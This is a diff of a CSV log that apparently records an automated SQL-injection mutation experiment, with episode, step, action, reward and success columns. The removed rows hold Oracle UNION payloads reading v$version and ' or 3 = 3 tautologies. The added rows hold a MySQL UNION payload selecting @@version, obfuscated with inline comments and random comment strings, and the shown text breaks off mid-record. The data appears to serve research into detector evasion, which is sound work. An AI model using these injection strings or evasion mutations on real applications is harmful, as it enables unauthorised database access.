-1)))/**/--/**/1""";6;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**/--/**/1""";0.0;0
-139;5;20;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**/--/**/1""";10;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**/--/**/1""";0.0;0
-140;5;21;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**/--/**/1""";1;""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
-1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
-1))) -- 1""";0.0;0
-141;5;22;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
-1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
-1))) -- 1""";23;""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
-1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
-1))) -- 1""";0.0;0
-142;5;23;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
-1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
-1))) -- 1""";11;""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
-1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
-1))) -- 1""";0.0;0
-143;5;24;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
-1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
-1))) -- 1""";10;"""
- select
- *
- from
- users
- where
- id
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- 
- 
- union
- select
- null,banner
- from
- v$version
- where
- rownum
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- --
- 1""";0.0;0
-144;5;25;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
- select
- *
- from
- users
- where
- id
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- 
- 
- union
- select
- null,banner
- from
- v$version
- where
- rownum
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- --
- 1""";15;"""
- select
- *
- from
- users
- where
- id
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- 
- 
- union
- select
- null,banner
- from
- v$version
- where
- rownum
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- --
- 1""";0.0;0
-145;5;26;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
- select
- *
- from
- users
- where
- id
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- 
- 
- union
- select
- null,banner
- from
- v$version
- where
- rownum
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- --
- 1""";23;"""
- select
- *
- from
- users
- where
- id
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- 
- 
- union
- select
- null,banner
- from
- v$version
- where
- rownum
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- --
- 1""";0.0;0
-146;5;27;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
- select
- *
- from
- users
- where
- id
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- 
- 
- union
- select
- null,banner
- from
- v$version
- where
- rownum
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- --
- 1""";12;"""
- select
- *
- from
- users
- where
- id
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- 
- 
- union
- select
- null,banner
- from
- v$version
- where
- rownum
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- --
- 1""";0.0;0
-147;5;28;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
- select
- *
- from
- users
- where
- id
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- 
- 
- union
- select
- null,banner
- from
- v$version
- where
- rownum
- =
- (SELECT
- (SELECT
- (SELECT#.~a#q^-
-1)))
- --
- 1""";10;"""
-
- select
-
- *
-
- from
-
- users
-
- where
-
- id
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- 
-
- 
-
- union
-
- select
-
- null,banner
-
- from
-
- v$version
-
- where
-
- rownum
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- --
-
- 1""";0.0;0
-148;5;29;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
-
- select
-
- *
-
- from
-
- users
-
- where
-
- id
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- 
-
- 
-
- union
-
- select
-
- null,banner
-
- from
-
- v$version
-
- where
-
- rownum
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- --
-
- 1""";23;"""
-
- select
-
- *
-
- from
-
- users
-
- where
-
- id
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- 
-
- 
-
- union
-
- select
-
- null,banner
-
- from
-
- v$version
-
- where
-
- rownum
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- --
-
- 1""";0.0;0
-149;5;30;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
-
- select
-
- *
-
- from
-
- users
-
- where
-
- id
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- 
-
- 
-
- union
-
- select
-
- null,banner
-
- from
-
- v$version
-
- where
-
- rownum
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- --
-
- 1""";4;"""
-
- select
-
- *
-
- from
-
- users
-
- where
-
- id
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- 
-
- 
-
- union
-
- select
-
- null,banner
-
- from
-
- v$version
-
- where
-
- rownum
-
- =
-
- (SELECT
-
- (SELECT
-
- (SELECT#.~a#q^-
-1)))
-
- --
-
- 1""";0.0;0
-150;6;1;' or 3 = 3;' or 3 = 3;24;' or 3 = 3;0.8;0
-151;6;2;' or 3 = 3;' or 3 = 3;20;' or 3 = 3;0.7000000000000001;0
-152;6;3;' or 3 = 3;' or 3 = 3;21;' or 3 = 3;0.6000000000000001;0
-153;6;4;' or 3 = 3;' or 3 = 3;23;' or 3 = 3;0.5;0
-154;6;5;' or 3 = 3;' or 3 = 3;7;' or 0x3 = 3;1.2000000000000002;0
-155;6;6;' or 3 = 3;' or 0x3 = 3;14;"'#^sX(w
-or#^sX(w
-0x3#^sX(w
-=#^sX(w
-3";9.5;1
+0;1;1;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";5;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";-0.5483871102333069;0
+1;1;2;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";14;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""";-0.20497237741947175;0
+2;1;3;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""";14;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""";-0.30497237741947175;0
+3;1;4;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""";20;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""";-0.4049723774194718;0
+4;1;5;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""";1;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""";-0.5049723774194718;0
+5;1;6;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""";16;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-0.6043956056237221;0
+6;1;7;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";3;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-0.7043956056237222;0
+7;1;8;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";4;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-0.8043956056237221;0
+8;1;9;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";4;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-0.9043956056237221;0
+9;1;10;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";20;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-1.004395605623722;0
+10;1;11;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";5;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-1.104395605623722;0
+11;1;12;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";1;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-1.2043956056237222;0
+12;1;13;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";6;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-1.3043956056237223;0
+13;1;14;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";25;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-1.4043956056237221;0
+14;1;15;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";6;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-1.5043956056237222;0
+15;1;16;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";25;"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";-1.604395605623722;0
+16;1;17;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
+union#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+NULL,#(Obk=(
+NULL,#(Obk=(
+#(Obk=(
+(#(Obk=(
+select#(Obk=(
+@@version#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+)#(Obk=(
+#(Obk=(
+#(Obk=(
+--""*";24;"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";-1.7835206001996995;0
+17;1;18;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";18;"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";-1.8835206001996996;0
+18;1;19;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";22;"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";-1.9835206001996994;0
+19;1;20;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";4;"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";-2.0835206001996998;0
+20;1;21;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";3;"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";-2.1835206001996994;0
+21;1;22;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";6;"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";-2.2835206001996995;0
+22;1;23;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
+union OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+NULL, OR 0#(Obk=(
+ OR 0#(Obk=(
+( OR 0#(Obk=(
+select OR 0#(Obk=(
+@@version OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+) OR 0#(Obk=(
+ OR 0#(Obk=(
+ OR 0#(Obk=(
+--""*";14;"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";-2.2667903497815134;0
+23;1;24;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";4;"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
